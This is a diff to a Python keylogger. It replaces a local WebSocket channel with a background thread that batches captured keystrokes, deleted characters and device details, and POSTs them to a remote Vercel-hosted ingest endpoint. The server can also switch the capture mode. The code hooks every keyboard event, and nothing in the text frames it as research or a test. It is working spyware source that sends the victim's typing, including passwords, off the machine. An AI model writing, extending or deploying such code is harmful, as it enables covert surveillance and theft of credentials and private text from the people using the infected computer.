@@ -5,7 +5,7 @@ import requests
 import time
 import threading
 import json
-import websocket
+import queue
 import datetime
 import socket
 import getpass
@@ -40,9 +40,11 @@ DEVICE_INFO = _build_device_info()
 log_file = "logs.txt"
 logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')
 
-# Define ws and ws_lock as global variables
-ws = None
-ws_lock = threading.Lock()
+
+# HTTP batching queue and lock
+batch_queue = queue.Queue()
+batch_lock = threading.Lock()
+current_mode = "structured"
 
 # Buffer to accumulate keystrokes as chronological segments of
 # [text, deleted]. Deleted segments record characters the user typed and
@@ -166,12 +168,8 @@ def _exit_prev_edit():
 
 
 def _send_edit_previous(payload):
-    try:
-        with ws_lock:
-            if ws and ws.sock and ws.sock.connected:
-                ws.send(json.dumps(payload))
-    except Exception as e:
-        print(f"Error sending edit_previous via WebSocket: {e}")
+    # Not supported in HTTP mode
+    pass
 
 
 def _prev_edit_insert(text):
@@ -208,24 +206,8 @@ def _prev_edit_backspace(count=1):
 
 
 def _send_delete_previous(count):
-    global last_flushed_text, ws, ws_lock
-    if count <= 0 or not last_flushed_text:
-        return
-    if (time.time() - last_char_time) > DELETE_PREVIOUS_WINDOW:
-        last_flushed_text = ""
-        return
-    count = min(count, len(last_flushed_text))
-    try:
-        with ws_lock:
-            if ws and ws.sock and ws.sock.connected:
-                ws.send(json.dumps({
-                    "type": "delete_previous",
-                    "count": count,
-                    "timestamp": time.time(),
-                }))
-        last_flushed_text = last_flushed_text[:-count]
-    except Exception as e:
-        print(f"Error sending delete_previous via WebSocket: {e}")
+    # Not supported in HTTP mode
+    pass
 
 # Track currently held keys
 held_keys = set()
@@ -246,20 +228,6 @@ def _master_exit():
     print("\nMaster exit triggered. Shutting down.")
     try:
         flush_buffer()
-    except Exception:
-        pass
-    try:
-        with ws_lock:
-            if ws is not None and ws.sock and ws.sock.connected:
-                ws.send(json.dumps({"type": "exit", "timestamp": time.time()}))
-    except Exception:
-        pass
-    # Give the message a moment to flush over the socket.
-    time.sleep(0.15)
-    try:
-        with ws_lock:
-            if ws is not None:
-                ws.close()
     except Exception:
         pass
     os._exit(0)
@@ -306,8 +274,7 @@ def fallback_flush():
 
 # Define a function to flush the buffer and send data
 def flush_buffer():
-    global keystroke_segments, ws, ws_lock, last_flushed_text, prev_cursor
-
+    global keystroke_segments, last_flushed_text, prev_cursor
     if keystroke_segments:
         live_snapshot = _live_text()
         try:
@@ -317,14 +284,17 @@ def flush_buffer():
                 if s[0]
             ]
             if payload:
-                with ws_lock:
-                    if ws and ws.sock and ws.sock.connected:
-                        ws.send(json.dumps({"data": payload, "timestamp": time.time()}))
+                with batch_lock:
+                    batch_queue.put({
+                        "device": DEVICE_INFO,
+                        "data": payload,
+                        "timestamp": time.time(),
+                    })
                 if live_snapshot:
                     last_flushed_text = live_snapshot
                     prev_cursor = None
         except Exception as e:
-            print(f"Error sending buffer via WebSocket: {e}")
+            print(f"Error queueing buffer: {e}")
         finally:
             keystroke_segments = []
 
@@ -455,86 +425,48 @@ def log_key_event(event):
 
 threading.Thread(target=fallback_flush, daemon=True).start()
 
-# Function to send logs via WebSocket
-def send_logs():
-    last_sent_size = 0  # Initialize within the WebSocket thread
-    ws = None  # Shared WebSocket object
-    ws_lock = threading.Lock()  # Lock to ensure thread-safe access to ws
 
-    def on_open(websocket):
-        print("WebSocket connection opened.")
-        with ws_lock:
-            nonlocal ws
-            ws = websocket
-
-    def on_close(websocket, close_status_code, close_msg):
-        print(f"WebSocket connection closed. Code: {close_status_code}, Message: {close_msg}")
-        if close_status_code or close_msg:
-            print("Connection closed due to an issue. Investigating...")
-        with ws_lock:
-            nonlocal ws
-            ws = None
-
-    def on_error(websocket, error):
-        print(f"WebSocket error: {error}")
-
-    def on_message(websocket, message):
-        print(f"Message from server: {message}")
-
-    def handle_server_message(_wsapp, message):
-        global current_mode
+# HTTP batching thread
+def batch_sender():
+    global current_mode
+    BATCH_INTERVAL = 2.0  # seconds
+    BATCH_MAX = 20
+    endpoint = "https://keylogger-py.vercel.app/api/ingest"
+    while True:
+        batch = []
         try:
-            parsed = json.loads(message)
-        except Exception as e:
-            print(f"Invalid server message: {e}")
-            return
-        new_mode = parsed.get("mode")
-        if new_mode in ("structured", "raw") and new_mode != current_mode:
-            # Flush any pending structured buffer before switching.
-            if current_mode == "structured":
-                flush_buffer()
-            current_mode = new_mode
-            print(f"Mode switched to: {current_mode}")
-
-    # Ensure WebSocket connection is persistent and reconnects automatically
-    def start_websocket():
-        global ws, ws_lock
-        while True:
+            # Wait for at least one item
+            item = batch_queue.get(timeout=BATCH_INTERVAL)
+            batch.append(item)
+        except Exception:
+            pass
+        # Gather up to BATCH_MAX or until interval
+        while not batch_queue.empty() and len(batch) < BATCH_MAX:
             try:
-                def _on_open(app):
-                    print("WebSocket connection opened.")
-                    try:
-                        app.send(json.dumps({"type": "hello", "device": DEVICE_INFO}))
-                    except Exception as e:
-                        print(f"Error sending hello: {e}")
+                batch.append(batch_queue.get_nowait())
+            except Exception:
+                break
+        if not batch:
+            continue
+        # Send batch
+        try:
+            for entry in batch:
+                resp = requests.post(endpoint, json=entry, timeout=5)
+                if resp.ok:
+                    data = resp.json()
+                    new_mode = data.get("mode")
+                    if new_mode and new_mode != current_mode:
+                        if current_mode == "structured":
+                            flush_buffer()
+                        current_mode = new_mode
+                        print(f"Mode switched to: {current_mode}")
+                else:
+                    print(f"Failed to POST: {resp.status_code}")
+        except Exception as e:
+            print(f"Batch send error: {e}")
 
-                websocket_app = websocket.WebSocketApp(
-                    "ws://localhost:6699",
-                    on_open=_on_open,
-                    on_close=lambda ws, code, msg: print(f"WebSocket closed: {code}, {msg}"),
-                    on_error=lambda ws, error: print(f"WebSocket error: {error}"),
-                    on_message=handle_server_message,
-                )
+threading.Thread(target=batch_sender, daemon=True).start()
 
-                # Assign the WebSocket object to the global variable
-                with ws_lock:
-                    ws = websocket_app
-
-                # Run the WebSocket connection in a blocking manner
-                websocket_app.run_forever()
-            except Exception as e:
-                print(f"WebSocket error: {e}")
-
-            print("WebSocket connection lost. Reconnecting in 5 seconds...")
-            time.sleep(5)  # Wait before attempting to reconnect
-
-    # Start the WebSocket connection in a separate thread
-    threading.Thread(target=start_websocket, daemon=True).start()
-
-    # Remove the send_new_logs thread since we are sending keys instantly
-
-# Start the WebSocket log sending
-send_logs()
 
 # Add a listener for key events
 keyboard.hook(log_key_event, suppress=False)
